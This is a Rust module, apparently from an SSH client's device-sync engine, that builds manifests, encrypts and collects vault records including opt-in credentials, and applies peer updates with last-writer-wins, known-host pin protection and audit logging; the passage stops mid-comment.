//! Manifest build / collect / apply helpers. The actual reconciliation
//! happens in `engine/mod.rs::handle_sync_session` and
//! `run_sync_session_as_client`; this module owns the vault-touching
//! bricks they call.
//!
//! Split out of `engine/mod.rs` for size; entry points are kept
//! `pub(crate)` so the in-crate integration tests can drive a manifest
//! round-trip without a live engine.

use std::collections::HashMap;
use std::sync::Arc;

use uuid::Uuid;

use oryxis_vault::VaultStore;

use crate::crypto;
use crate::error::SyncError;
use crate::protocol::{self, EntityType, ManifestEntry};

/// Fetch the persisted X25519 shared secret for a paired peer and
/// coerce it to a fixed 32-byte array. Returns `None` if the peer
/// doesn't have one (legacy rows, or a future ABI we don't recognise).
pub(super) fn peer_shared_secret(
    vault: &Arc<std::sync::Mutex<VaultStore>>,
    peer_id: &Uuid,
) -> Result<Option<[u8; 32]>, SyncError> {
    let v = vault.lock().map_err(|_| SyncError::Vault("Lock".into()))?;
    let bytes = v.get_sync_peer_shared_secret(peer_id)?;
    Ok(bytes.and_then(|b| <[u8; 32]>::try_from(b.as_slice()).ok()))
}

/// Fetch the stored Ed25519 public key of an active paired peer. Returns
/// `None` for an unknown or deactivated peer; callers decide whether that
/// is a soft fall-through (don't leak verify timing) or a hard
/// `PeerNotFound`.
pub(super) fn active_peer_pubkey(
    vault: &Arc<std::sync::Mutex<VaultStore>>,
    peer_id: &Uuid,
) -> Result<Option<Vec<u8>>, SyncError> {
    let v = vault
        .lock()
        .map_err(|_| SyncError::Vault("Lock failed".into()))?;
    Ok(v.list_sync_peers()?
        .into_iter()
        .find(|p| p.peer_id == *peer_id && p.is_active)
        .map(|p| p.public_key))
}

/// SQLite table behind each syncable entity type, in manifest order.
/// Drives the lean stamp queries in [`build_manifest`]; the names are
/// re-validated against a whitelist inside `list_entity_stamps`.
const STAMP_TABLES: [(EntityType, &str); 11] = [
    (EntityType::Connection, "connections"),
    (EntityType::SshKey, "keys"),
    (EntityType::Identity, "identities"),
    (EntityType::ProxyIdentity, "proxy_identities"),
    (EntityType::Group, "groups"),
    (EntityType::Snippet, "snippets"),
    (EntityType::PortForwardRule, "port_forward_rules"),
    (EntityType::KnownHost, "known_hosts"),
    (EntityType::CloudProfile, "cloud_profiles"),
    (EntityType::SessionGroup, "session_groups"),
    (EntityType::LoginScript, "login_scripts"),
];

/// Build a manifest of all syncable entities in the vault, plus a
/// deletion entry (`is_deleted = true`) for every tombstone recorded
/// in `sync_metadata`. The tombstones are what let a delete propagate:
/// without them a peer that still holds the entity would push its
/// stale copy back and the delete would silently undo itself.
pub(crate) fn build_manifest(
    vault: &Arc<std::sync::Mutex<VaultStore>>,
) -> Result<Vec<ManifestEntry>, SyncError> {
    let v = vault.lock().map_err(|_| SyncError::Vault("Lock".into()))?;
    let mut entries = Vec::new();

    // Lean `(id, updated_at)` projections per table. The manifest only
    // needs the LWW stamps, so the full-row SELECT + JSON decode that
    // the `list_*` methods do would be wasted work here (and this runs
    // at least twice per peer per sync tick).
    for (entity_type, table) in STAMP_TABLES {
        for (entity_id, updated_at) in v.list_entity_stamps(table)? {
            entries.push(ManifestEntry {
                entity_type,
                entity_id,
                updated_at,
                is_deleted: false,
            });
        }
    }

    // Tombstones. A live entity always wins over a stale tombstone for
    // the same id (the entity was re-created from a newer peer copy
    // after the delete), so we only surface tombstones whose id isn't
    // already present as a live entry above.
    let live: std::collections::HashSet<(EntityType, Uuid)> =
        entries.iter().map(|e| (e.entity_type, e.entity_id)).collect();
    for tomb in v.list_tombstones()? {
        let Some(entity_type) = EntityType::from_wire_str(&tomb.entity_type) else {
            // Tombstone for an entity type this build doesn't know.
            // Skip it rather than fail the whole manifest.
            continue;
        };
        if live.contains(&(entity_type, tomb.entity_id)) {
            continue;
        }
        entries.push(ManifestEntry {
            entity_type,
            entity_id: tomb.entity_id,
            updated_at: tomb.deleted_at,
            is_deleted: true,
        });
    }

    Ok(entries)
}

/// Effective local LWW stamp per entity: the live `updated_at`, or a
/// tombstone's `deleted_at` when the entity was deleted. A live entity
/// wins over a stale tombstone for the same id (mirrors `build_manifest`).
///
/// Operates on an already-locked guard so callers that hold the vault
/// lock (`collect_records`, `apply_records`) can build the index without
/// re-locking (which would deadlock the `std::sync::Mutex`). Used to stamp
/// outgoing records with their real timestamp and to reject incoming
/// records that aren't strictly newer than what we already hold.
fn local_stamps(
    v: &VaultStore,
) -> Result<HashMap<(EntityType, Uuid), chrono::DateTime<chrono::Utc>>, SyncError> {
    let mut stamps: HashMap<(EntityType, Uuid), chrono::DateTime<chrono::Utc>> = HashMap::new();
    for (entity_type, table) in STAMP_TABLES {
        for (entity_id, updated_at) in v.list_entity_stamps(table)? {
            stamps.insert((entity_type, entity_id), updated_at);
        }
    }
    for tomb in v.list_tombstones()? {
        let Some(entity_type) = EntityType::from_wire_str(&tomb.entity_type) else {
            continue;
        };
        // `or_insert`: a live entry above wins over a stale tombstone.
        stamps
            .entry((entity_type, tomb.entity_id))
            .or_insert(tomb.deleted_at);
    }
    Ok(stamps)
}

/// Collect serialized records requested by the peer. A requested ref
/// that matches a tombstone is returned as a deletion marker (empty
/// payload, `is_deleted = true`) instead of an entity payload.
///
/// `shared_secret` is the X25519-derived key from pairing time. When
/// `Some`, every non-tombstone payload is sealed with
/// ChaCha20-Poly1305 before going on the wire. Tombstone records skip
/// encryption (their payload is empty by construction).
pub(crate) fn collect_records(
    vault: &Arc<std::sync::Mutex<VaultStore>>,
    needed: &[protocol::DeltaRef],
    shared_secret: Option<&[u8; 32]>,
) -> Result<Vec<protocol::SyncRecord>, SyncError> {
    let v = vault.lock().map_err(|_| SyncError::Vault("Lock".into()))?;
    // Tombstones recorded in `sync_metadata`. Loaded once up front and
    // indexed by (type, id) so a large `needed` list neither re-queries
    // nor re-scans per ref.
    let tombstones: HashMap<(EntityType, Uuid), chrono::DateTime<chrono::Utc>> = v
        .list_tombstones()?
        .into_iter()
        .filter_map(|t| {
            EntityType::from_wire_str(&t.entity_type)
                .map(|et| ((et, t.entity_id), t.deleted_at))
        })
        .collect();
    // Per-peer AEAD cipher, built once instead of once per record. A
    // missing secret means E2E was never established; refuse to ship
    // entity payloads in clear rather than silently downgrading. v5+
    // peers always carry a secret (seeded at pairing), so this only
    // fires on a corrupt/partial peer row, never in normal operation.
    let secret = shared_secret.ok_or_else(|| {
        SyncError::Crypto("peer has no shared secret; refusing to send plaintext".into())
    })?;
    let cipher = crypto::PayloadCipher::new(secret)?;
    // Real per-entity LWW stamps, so the receiver can resolve conflicts
    // against its own copy instead of trusting an apply-time clock.
    let stamps = local_stamps(&v)?;
    // Off by default. When on, password fields are included in the
    // wrapper payloads, older peers ignore them automatically. The
    // setting lives in the SQLite `settings` table so it flips per
    // device without touching the model.
    let sync_passwords = v
        .get_setting("sync_passwords")
        .ok()
        .flatten()
        .as_deref()
        == Some("true");
    let mut records = Vec::new();

    // Lazily-loaded per-entity-type caches keyed by id. Each table is
    // read (and JSON-decoded) at most once per call instead of once
    // per requested ref, which used to make a large `needed` list
    // O(refs x rows).
    let mut conn_cache = None;
    let mut key_cache = None;
    let mut ident_cache = None;
    let mut proxy_ident_cache = None;
    let mut group_cache = None;
    let mut session_group_cache = None;
    let mut snippet_cache = None;
    let mut rule_cache = None;
    let mut known_host_cache = None;
    let mut cloud_profile_cache = None;
    let mut login_script_cache = None;

    // Fill `$cache` from `v.$list()` on first use, then hand back a
    // `&HashMap<Uuid, T>` for lookup.
    macro_rules! cached {
        ($cache:ident, $list:ident) => {{
            if $cache.is_none() {
                $cache = Some(
                    v.$list()?
                        .into_iter()
                        .map(|item| (item.id, item))
                        .collect::<HashMap<_, _>>(),
                );
            }
            $cache.as_ref().expect("cache filled above")
        }};
    }

    for delta in needed {
        // A requested ref that matches a tombstone is a deletion: emit
        // a marker record with an empty payload carrying the deletion
        // timestamp, so the receiver's LWW resolves it like any other
        // record and `apply_records` runs the local delete.
        if let Some(deleted_at) = tombstones.get(&(delta.entity_type, delta.entity_id)) {
            records.push(protocol::SyncRecord {
                entity_type: delta.entity_type,
                entity_id: delta.entity_id,
                updated_at: *deleted_at,
                is_deleted: true,
                payload: Vec::new(),
            });
            continue;
        }

        // For now, payload is unencrypted JSON (E2E encryption uses
        // shared secret, added in pairing flow). The `encode!` macro
        // wraps `serde_json::to_vec` so a failure surfaces via
        // tracing instead of shipping empty bytes that the receiver
        // would then fail to deserialize. In practice `to_vec` on
        // owned values never fails, but if it ever did we want loud
        // diagnostics rather than silent record loss.
        macro_rules! encode {
            ($value:expr, $label:literal) => {
                match serde_json::to_vec(&$value) {
                    Ok(bytes) => Some(bytes),
                    Err(e) => {
                        tracing::error!(
                            "sync: serialize {} for {} failed: {e}",
                            $label,
                            delta.entity_id
                        );
                        None
                    }
                }
            };
        }

        let payload = match delta.entity_type {
            EntityType::Connection => {
                let conns = cached!(conn_cache, list_connections);
                conns.get(&delta.entity_id).and_then(|c| {
                    // When syncing passwords, send the authoritative state: a
                    // value sets it, an absent value flagged cleared removes
                    // it on the peer. Off = omit so the peer preserves.
                    let (password, password_cleared) = if sync_passwords {
                        let pw = v.get_connection_password(&c.id).ok().flatten();
                        let cleared = pw.is_none();
                        (pw, cleared)
                    } else {
                        (None, false)
                    };
                    let (proxy_password, proxy_password_cleared) = if sync_passwords {
                        let pw = v.get_proxy_password(&c.id).ok().flatten();
                        let cleared = pw.is_none();
                        (pw, cleared)
                    } else {
                        (None, false)
                    };
                    let (totp_secret, totp_secret_cleared) = if sync_passwords {
                        let s = v.get_connection_totp_secret(&c.id).ok().flatten();
                        let cleared = s.is_none();
                        (s, cleared)
                    } else {
                        (None, false)
                    };
                    let (target_password, target_password_cleared) = if sync_passwords {
                        let pw = v.get_connection_target_password(&c.id).ok().flatten();
                        let cleared = pw.is_none();
                        (pw, cleared)
                    } else {
                        (None, false)
                    };
                    // Host data travels; a local trust decision does
                    // not. Stripping on SEND keeps the peer from ever
                    // seeing a "skip certificate verification" flag it
                    // could apply to a host its owner never inspected.
                    let mut connection = c.clone();
                    connection.strip_local_trust();
                    // Recency is a fact about THIS device's use of the
                    // host (the tray's recent list, the JumpList), so it
                    // stays home: a peer's "last used" is not ours, and
                    // `mark_host_used` never bumps `updated_at`, which is
                    // what would otherwise let a peer's later edit of the
                    // host replace it with theirs. The apply side keeps
                    // the local value for the same reason.
                    connection.last_used = None;
                    let wrapper = protocol::SyncConnection {
                        connection,
                        password,
                        password_cleared,
                        proxy_password,
                        proxy_password_cleared,
                        totp_secret,
                        totp_secret_cleared,
                        target_password,
                        target_password_cleared,
                    };
                    encode!(wrapper, "Connection")
                })
            }
            EntityType::SshKey => {
                let keys = cached!(key_cache, list_keys);
                keys.get(&delta.entity_id).and_then(|k| {
                    // The private key is a credential, so it travels only
                    // when `sync_passwords` is on, like every other secret.
                    // There is no `_cleared` companion here: absence always
                    // means preserve, because a private key is the one
                    // synced secret its owner cannot retype. See
                    // `protocol::SyncSshKey`.
                    let private_key = if sync_passwords {
                        v.get_key_private(&k.id).ok().flatten()
                    } else {
                        None
                    };
                    let wrapper = protocol::SyncSshKey {
                        key: k.clone(),
                        private_key,
                    };
                    encode!(wrapper, "SshKey")
                })
            }
            EntityType::Identity => {
                let idents = cached!(ident_cache, list_identities);
                idents.get(&delta.entity_id).and_then(|i| {
                    let (password, password_cleared) = if sync_passwords {
                        let pw = v.get_identity_password(&i.id).ok().flatten();
                        let cleared = pw.is_none();
                        (pw, cleared)
                    } else {
                        (None, false)
                    };
                    let wrapper = protocol::SyncIdentity {
                        identity: i.clone(),
                        password,
                        password_cleared,
                    };
                    encode!(wrapper, "Identity")
                })
            }
            EntityType::ProxyIdentity => {
                let items = cached!(proxy_ident_cache, list_proxy_identities);
                items.get(&delta.entity_id).and_then(|pi| {
                    let (password, password_cleared) = if sync_passwords {
                        let pw = v.get_proxy_identity_password(&pi.id).ok().flatten();
                        let cleared = pw.is_none();
                        (pw, cleared)
                    } else {
                        (None, false)
                    };
                    let wrapper = protocol::SyncProxyIdentity {
                        proxy_identity: pi.clone(),
                        password,
                        password_cleared,
                    };
                    encode!(wrapper, "ProxyIdentity")
                })
            }
            EntityType::Group => {
                let groups = cached!(group_cache, list_groups);
                groups.get(&delta.entity_id)
                    .and_then(|g| encode!(g, "Group"))
            }
            EntityType::SessionGroup => {
                let session_groups = cached!(session_group_cache, list_session_groups);
                session_groups.get(&delta.entity_id)
                    .and_then(|sg| encode!(sg, "SessionGroup"))
            }
            EntityType::Snippet => {
                let snippets = cached!(snippet_cache, list_snippets);
                snippets.get(&delta.entity_id)
                    .and_then(|s| encode!(s, "Snippet"))
            }
            EntityType::PortForwardRule => {
                let rules = cached!(rule_cache, list_port_forward_rules);
                rules.get(&delta.entity_id)
                    .and_then(|r| encode!(r, "PortForwardRule"))
            }
            EntityType::KnownHost => {
                let hosts = cached!(known_host_cache, list_known_hosts);
                hosts.get(&delta.entity_id)
                    .and_then(|kh| encode!(kh, "KnownHost"))
            }
            EntityType::LoginScript => {
                let items = cached!(login_script_cache, list_login_scripts);
                items
                    .get(&delta.entity_id)
                    .and_then(|s| encode!(s, "LoginScript"))
            }
            EntityType::CloudProfile => {
                let items = cached!(cloud_profile_cache, list_cloud_profiles);
                items.get(&delta.entity_id).and_then(|cp| {
                    let (secret, secret_cleared) = if sync_passwords {
                        let s = v.get_cloud_profile_secret(&cp.id).ok().flatten();
                        let cleared = s.is_none();
                        (s, cleared)
                    } else {
                        (None, false)
                    };
                    let wrapper = protocol::SyncCloudProfile {
                        profile: cp.clone(),
                        secret,
                        secret_cleared,
                    };
                    encode!(wrapper, "CloudProfile")
                })
            }
        };

        if let Some(data) = payload {
            // Seal the payload with the per-peer shared secret (always
            // present, see the `secret` binding above).
            let wire_payload = cipher.encrypt(&data)?;
            records.push(protocol::SyncRecord {
                entity_type: delta.entity_type,
                entity_id: delta.entity_id,
                // The entity's real `updated_at`, not an apply-time clock,
                // so the receiver's LWW compares like-for-like. Falls back
                // to now() only if the row vanished between caching and here.
                updated_at: stamps
                    .get(&(delta.entity_type, delta.entity_id))
                    .copied()
                    .unwrap_or_else(chrono::Utc::now),
                is_deleted: false,
                payload: wire_payload,
            });
        }
    }

    Ok(records)
}

/// Apply received records to the local vault. A record with
/// `is_deleted = true` runs the matching `delete_*`, which also records
/// a fresh local tombstone, so the deletion keeps propagating onward to
/// this device's other peers.
///
/// `shared_secret` is the X25519-derived key from pairing time. When
/// `Some`, every non-tombstone payload is unsealed with
/// ChaCha20-Poly1305 before deserialization. A decrypt failure means
/// the record was forged or tampered with; we skip it and warn.
/// Map a wire secret (value + `*_cleared` sentinel) to the vault `save_*`
/// password argument: a value sets it, an absent-but-cleared field clears
/// it (relying on the vault's `Some("")` = clear contract), and an
/// absent-not-cleared field preserves the receiver's existing value.
fn secret_arg(value: &Option<String>, cleared: bool) -> Option<&str> {
    match value {
        Some(s) => Some(s.as_str()),
        None if cleared => Some(""),
        None => None,
    }
}

pub(crate) fn apply_records(
    vault: &Arc<std::sync::Mutex<VaultStore>>,
    records: &[protocol::SyncRecord],
    shared_secret: Option<&[u8; 32]>,
) -> Result<(), SyncError> {
    let v = vault.lock().map_err(|_| SyncError::Vault("Lock".into()))?;

    // Per-peer AEAD cipher, built once instead of once per record. A
    // missing secret means E2E was never established; refuse the batch
    // rather than accepting plaintext payloads (symmetric with the send
    // side in `collect_records`). v5+ peers always carry a secret.
    let secret = shared_secret.ok_or_else(|| {
        SyncError::Crypto("peer has no shared secret; refusing to accept plaintext".into())
    })?;
    let cipher = crypto::PayloadCipher::new(secret)?;

    // Effective local stamps for defensive last-writer-wins. The client
    // pull path already filters via manifest comparison, but an
    // unsolicited `DeltaPush` would otherwise overwrite newer local data.
    let local = local_stamps(&v)?;

    // One explicit transaction for the whole batch. Each save_* /
    // delete_* below would otherwise run as its own implicit SQLite
    // transaction (one fsync per record); a large delta then costs
    // hundreds of fsyncs instead of one. Per-record failures keep
    // their existing semantics (warn and continue), so the loop has
    // no early-error exit; keep it that way, or the open transaction
    // would leak past the `?`.
    v.begin_batch()?;

    // This device's own recency per host, read once and only if a
    // connection record arrives (see the `last_used` rule in the
    // Connection arm below).
    let mut local_recency: Option<
        std::collections::HashMap<Uuid, Option<chrono::DateTime<chrono::Utc>>>,
    > = None;

    for record in records {
        // Defensive LWW, before decrypt and before the delete branch:
        // only apply a record strictly newer than what we already hold.
        // Equal timestamps are a no-op (matches `conflict::resolve`'s
        // `Skip`), and this gates deletes too so a stale tombstone can't
        // clobber a newer local edit. Records for entities we've never
        // seen (no local stamp) always pass.
        // Whether this record REPLACES something already here, which
        // the same lookup already answers. Only overwrites are worth
        // an audit line (see `log_route_overwrite`); the peer's new
        // entities are ordinary replication, and logging those would
        // write one line per host on a first sync.
        let overwrites_local = local.contains_key(&(record.entity_type, record.entity_id));
        if let Some(local_ts) = local.get(&(record.entity_type, record.entity_id)) {
            if record.updated_at <= *local_ts {
                continue;
            }
        }

        if record.is_deleted {
            // Handle deletion. A vault error here is non-fatal (the
            // peer is allowed to be ahead of us on its own deletes)
            // but must surface as a warning so a real bug like a
            // locked row, SQLite I/O failure, or schema mismatch
            // doesn't disappear into the void.
            let result = match record.entity_type {
                EntityType::Connection => v.delete_connection(&record.entity_id),
                EntityType::SshKey => v.delete_key(&record.entity_id),
                EntityType::Identity => v.delete_identity(&record.entity_id),
                EntityType::ProxyIdentity => v.delete_proxy_identity(&record.entity_id),
                EntityType::Group => v.delete_group(&record.entity_id),
                EntityType::SessionGroup => v.delete_session_group(&record.entity_id),
                EntityType::Snippet => v.delete_snippet(&record.entity_id),
                EntityType::KnownHost => v.delete_known_host(&record.entity_id),
                EntityType::CloudProfile => v.delete_cloud_profile(&record.entity_id),
                EntityType::PortForwardRule => {
                    v.delete_port_forward_rule(&record.entity_id)
                }
                EntityType::LoginScript => v.delete_login_script(&record.entity_id),
            };
            if let Err(e) = result {
                tracing::warn!(
                    "sync: failed to apply delete for {} {}: {e}",
                    record.entity_type,
                    record.entity_id
                );
            }
            continue;
        }

        // Unseal the payload with the per-peer secret. A decrypt
        // failure (tampering, key mismatch) means the record is forged
        // or corrupt; skip it and warn.
        let payload: Vec<u8> = match cipher.decrypt(&record.payload) {
            Ok(plain) => plain,
            Err(e) => {
                tracing::warn!(
                    "sync: failed to decrypt {} {}: {e}",
                    record.entity_type,
                    record.entity_id
                );
                continue;
            }
        };

        // Helper: every save_* below shares the same "warn on Err"
        // shape. Inline so the closure can refer back to the record's
        // entity_type and id for the log line.
        macro_rules! log_save {
            ($expr:expr) => {
                if let Err(e) = $expr {
                    tracing::warn!(
                        "sync: failed to apply update for {} {}: {e}",
                        record.entity_type,
                        record.entity_id
                    );
                }
            };
        }

        match record.entity_type {
            EntityType::Connection => {
                // `SyncConnection` flattens the inner `Connection`, so a
                // payload from a pre-wrapper peer (bare `Connection` JSON)
                // still deserializes, the optional password fields just
                // resolve to `None` via `#[serde(default)]`.
                match serde_json::from_slice::<protocol::SyncConnection>(&payload) {
                    Ok(mut sc) => {
                        // Both halves of the rule: a peer that predates
                        // the strip (or one that lies) cannot arm a
                        // "skip certificate verification" flag on this
                        // machine either.
                        sc.connection.strip_local_trust();
                        let id = sc.connection.id;
                        // This device's recency stays this device's:
                        // whatever the peer sent (nothing since the send
                        // side strips it, their own stamp before that),
                        // the row keeps the `last_used` it had here, and
                        // a host new to this machine starts unused.
                        let recency = local_recency.get_or_insert_with(|| {
                            v.list_connections()
                                .map(|cs| cs.into_iter().map(|c| (c.id, c.last_used)).collect())
                                .unwrap_or_default()
                        });
                        sc.connection.last_used = recency.get(&id).copied().flatten();
                        if overwrites_local {
                            let route = match sc.connection.proxy.as_ref() {
                                Some(p) => format!(
                                    "{}:{} via {}",
                                    sc.connection.hostname,
                                    sc.connection.port,
                                    proxy_summary(p)
                                ),
                                None => {
                                    format!("{}:{}", sc.connection.hostname, sc.connection.port)
                                }
                            };
                            log_route_overwrite(
                                &v,
                                &sc.connection.label,
                                &sc.connection.hostname,
                                format!("host updated by a sync peer: {route}"),
                            );
                        }
                        log_save!(v.save_connection(
                            &sc.connection,
                            secret_arg(&sc.password, sc.password_cleared)
                        ));
                        // Some(arg) = set/clear on the wire; None = preserve.
                        if let Some(arg) = secret_arg(&sc.proxy_password, sc.proxy_password_cleared)
                        {
                            log_save!(v.set_proxy_password(&id, Some(arg)));
                        }
                        if let Some(arg) = secret_arg(&sc.totp_secret, sc.totp_secret_cleared) {
                            log_save!(v.set_connection_totp_secret(&id, Some(arg)));
                        }
                        if let Some(arg) =
                            secret_arg(&sc.target_password, sc.target_password_cleared)
                        {
                            log_save!(v.set_connection_target_password(&id, Some(arg)));
                        }
                    }
                    Err(e) => tracing::warn!(
                        "sync: bad Connection payload for {}: {e}",
                        record.entity_id
                    ),
                }
            }
            EntityType::SshKey => {
                // `SyncSshKey` flattens the model, so a bare `SshKey`
                // payload from a pre-wrapper peer still deserializes; its
                // `private_key` resolves to `None` via `#[serde(default)]`,
                // which is `save_key`'s "keep the existing blob". The
                // tri-state's clearing arm is deliberately unreachable from
                // sync: only a tombstone removes a private key from a peer,
                // which is also why an empty PEM (`Some("")`, the argument
                // that CLEARS) is filtered rather than trusted. No honest
                // sender produces one, and a peer is not the authority on
                // erasing material this device cannot recover.
                match serde_json::from_slice::<protocol::SyncSshKey>(&payload) {
                    Ok(sk) => log_save!(v.save_key(
                        &sk.key,
                        sk.private_key.as_deref().filter(|pem| !pem.is_empty())
                    )),
                    Err(e) => tracing::warn!(
                        "sync: bad SshKey payload for {}: {e}",
                        record.entity_id
                    ),
                }
            }
            EntityType::Identity => {
                match serde_json::from_slice::<protocol::SyncIdentity>(&payload) {
                    Ok(si) => log_save!(v.save_identity(
                        &si.identity,
                        secret_arg(&si.password, si.password_cleared)
                    )),
                    Err(e) => tracing::warn!(
                        "sync: bad Identity payload for {}: {e}",
                        record.entity_id
                    ),
                }
            }
            EntityType::ProxyIdentity => {
                match serde_json::from_slice::<protocol::SyncProxyIdentity>(&payload) {
                    Ok(spi) => {
                        if overwrites_local {
                            let kind = proxy_summary(
                                &oryxis_core::models::connection::ProxyConfig {
                                    proxy_type: spi.proxy_identity.proxy_type.clone(),
                                    host: spi.proxy_identity.host.clone(),
                                    port: spi.proxy_identity.port,
                                    username: None,
                                    password: None,
                                },
                            );
                            log_route_overwrite(
                                &v,
                                &spi.proxy_identity.label,
                                &spi.proxy_identity.host,
                                format!("proxy updated by a sync peer: {kind}"),
                            );
                        }
                        log_save!(v.save_proxy_identity(
                            &spi.proxy_identity,
                            secret_arg(&spi.password, spi.password_cleared)
                        ))
                    }
                    Err(e) => tracing::warn!(
                        "sync: bad ProxyIdentity payload for {}: {e}",
                        record.entity_id
                    ),
                }
            }
            EntityType::Group => {
                match serde_json::from_slice::<oryxis_core::models::Group>(&payload) {
                    Ok(group) => {
                        // Only when the group actually SETS something:
                        // its defaults are inherited by every host
                        // inside it that leaves the field empty, which
                        // is how one write moves many routes at once.
                        if overwrites_local
                            && group.defaults.as_ref().is_some_and(|d| !d.is_empty())
                        {
                            log_route_overwrite(
                                &v,
                                &group.label,
                                "",
                                "group defaults updated by a sync peer".to_string(),
                            );
                        }
                        log_save!(v.save_group(&group))
                    }
                    Err(e) => tracing::warn!(
                        "sync: bad Group payload for {}: {e}",
                        record.entity_id
                    ),
                }
            }
            EntityType::SessionGroup => {
                match serde_json::from_slice::<oryxis_core::models::SessionGroup>(&payload) {
                    Ok(sg) => log_save!(v.save_session_group(&sg)),
                    Err(e) => tracing::warn!(
                        "sync: bad SessionGroup payload for {}: {e}",
                        record.entity_id
                    ),
                }
            }
            EntityType::Snippet => {
                match serde_json::from_slice::<oryxis_core::models::Snippet>(&payload) {
                    Ok(snippet) => log_save!(v.save_snippet(&snippet)),
                    Err(e) => tracing::warn!(
                        "sync: bad Snippet payload for {}: {e}",
                        record.entity_id
                    ),
                }
            }
            EntityType::KnownHost => {
                match serde_json::from_slice::<oryxis_core::models::KnownHost>(&payload) {
                    Ok(kh) => {
                        // A pin is what makes a server's key stop
                        // prompting, and it is a decision a human made
                        // at a fingerprint prompt ON THIS DEVICE. A peer
                        // may INTRODUCE one for an endpoint this vault
                        // has never pinned (ordinary replication, and
                        // the reason the category syncs at all), but it
                        // may not silently REPLACE one.
                        //
                        // The check has to be by the semantic key, not
                        // by entity id: `save_known_host` keeps one row
                        // per (hostname, port, key_type) and deletes the
                        // others first, so a record carrying a FRESH id
                        // is not an insert, it is a replacement. That is
                        // also why `overwrites_local` cannot see this
                        // case: it is keyed by entity id, so a forged
                        // record with a new id reads as brand new and
                        // never reaches the audit line below.
                        //
                        // Refusing costs the fleet automatic propagation
                        // of a key ROTATION, and what replaces it is the
                        // ordinary "Changed" prompt on the next connect:
                        // the one moment a human should be looking at a
                        // fingerprint anyway. Deletions are deliberately
                        // NOT gated here, so removing a pin (or clearing
                        // them all) still propagates.
                        let replaces_local_pin = v
                            .list_known_hosts()
                            .unwrap_or_default()
                            .into_iter()
                            .find(|h| {
                                h.hostname == kh.hostname
                                    && h.port == kh.port
                                    && h.key_type == kh.key_type
                            })
                            .is_some_and(|h| h.fingerprint != kh.fingerprint);
                        if replaces_local_pin {
                            tracing::warn!(
                                "sync: refusing a peer's key change for {} port {} ({}); \
                                 the next connect re-verifies",
                                kh.hostname,
                                kh.port,
                                kh.key_type
                            );
                            log_route_overwrite(
                                &v,
                                &kh.hostname,
                                &kh.hostname,
                                format!(
                                    "known host key change from a sync peer REFUSED: {} port {} ({}); \
                                     the next connect asks",
                                    kh.hostname, kh.port, kh.key_type
                                ),
                            );
                        } else {
                            if overwrites_local {
                                log_route_overwrite(
                                    &v,
                                    &kh.hostname,
                                    &kh.hostname,
                                    format!(
                                        "known host key updated by a sync peer: {} port {} ({})",
                                        kh.hostname, kh.port, kh.key_type
                                    ),
                                );
                            }
                            log_save!(v.save_known_host(&kh))
                        }
                    }
                    Err(e) => tracing::warn!(
                        "sync: bad KnownHost payload for {}: {e}",
                        record.entity_id
                    ),
                }
            }
            EntityType::CloudProfile => {
                match serde_json::from_slice::<protocol::SyncCloudProfile>(&payload) {
                    Ok(scp) => log_save!(v.save_cloud_profile(
                        &scp.profile,
                        secret_arg(&scp.secret, scp.secret_cleared)
                    )),
                    Err(e) => tracing::warn!(
                        "sync: bad CloudProfile payload for {}: {e}",
                        record.entity_id
                    ),
                }
            }
            EntityType::PortForwardRule => {
                match serde_json::from_slice::<oryxis_core::models::PortForwardRule>(&payload) {
                    Ok(rule) => {
                        // Auto-start only: that flag is what turns a
                        // stored rule into a dial at the next launch,
                        // with nobody present.
                        if overwrites_local && rule.auto_start {
                            log_route_overwrite(
                                &v,
                                &rule.label,
                                &rule.target_host,
                                "auto-starting port forward updated by a sync peer".to_string(),
                            );
                        }
                        log_save!(v.save_port_forward_rule(&rule))
                    }
                    Err(e) => tracing::warn!(
                        "sync: bad PortForwardRule payload for {}: {e}",
                        record.entity_id
                    ),
                }
            }
            EntityType::LoginScript => {
                match serde_json::from_slice::<oryxis_core::models::LoginScript>(&payload) {
                    Ok(script) => {
                        // A login script types into the session on its
                        // own, so a peer editing one edits what gets
                        // sent to the server.
                        if overwrites_local {
                            log_route_overwrite(
                                &v,
                                &script.name,
                                "",
                                "login script updated by a sync peer".to_string(),
                            );
                        }
                        log_save!(v.save_login_script(&script))
                    }
                    Err(e) => tracing::warn!(
                        "sync: bad LoginScript payload for {}: {e}",
                        record.entity_id
                    ),
                }
            }
        }
    }

    // Repair any parent cycle this batch created, inside the same
    // transaction. Checked ONCE over the final state rather than per
    // record: a cycle is the JOINT result of several records (device A
    // sets G1.parent = G2 while device B sets G2.parent = G1), and a
    // mid-batch snapshot can look cyclic while the completed batch is
    // not, so a per-record check would detach valid hierarchies.
    if records.iter().any(|r| r.entity_type == EntityType::Group) {
        break_group_cycles(&v);
    }

    // A failed COMMIT can leave the transaction open; roll it back so
    // the next batch on this connection doesn't trip over it.
    if let Err(e) = v.commit_batch() {
        v.rollback_batch();
        return Err(e.into());
    }

    Ok(())
}

/// Detach the groups that close a parent cycle, so the STORED tree is
/// acyclic.
///
/// The dashboard already degrades an unreachable group to rendering at
/// root, so this is not about what the user sees. It is about the data:
/// a cycle left on disk is re-sent on every sync and every future
/// consumer of the hierarchy (exporters, importers, group settings
/// inheritance) has to carry its own loop guard or hang. Repairing at
/// the write boundary makes acyclicity an invariant the rest of the app
/// can rely on.
///
/// `updated_at` is deliberately PRESERVED on the repaired row. Bumping
/// it would push the repair back out as a new record and, since every
/// peer repairs the same cycle independently and deterministically,
/// that is pure write amplification. Keeping the stamp means the peer's
/// next copy of the cyclic record is no longer strictly newer than the
/// local row, so the defensive LWW at the top of `apply_records` skips
/// it and the cycle does not come back.
///
/// Best-effort by design, matching the per-record `warn and continue`
/// semantics of the loop above: a failure here must not abort a batch
/// that otherwise applied cleanly.
fn break_group_cycles(v: &VaultStore) {
    let groups = match v.list_groups() {
        Ok(g) => g,
        Err(e) => {
            tracing::warn!("sync: cannot read groups to check for parent cycles: {e}");
            return;
        }
    };
    for id in oryxis_core::models::Group::cycle_breakers(&groups) {
        let Some(group) = groups.iter().find(|g| g.id == id) else {
            continue;
        };
        let mut repaired = group.clone();
        repaired.parent_id = None;
        match v.save_group(&repaired) {
            Ok(()) => tracing::warn!(
                "sync: parent cycle detected, detaching group {} ({}) to root",
                repaired.label,
                repaired.id
            ),
            Err(e) => tracing::warn!("sync: cannot detach cyclic group {}: {e}", repaired.id),
        }
    }
}

/// Record that a peer overwrote something route-bearing.
///
/// Sync applies a peer's writes with no prompt and no per-record UI: a
/// completed round reports two counters and nothing else. That is fine
/// for the labels, colours and notes that make up most of a vault, and
/// it is not fine for the handful of fields that decide WHERE a
/// connection goes and WHAT runs to get there, because those are
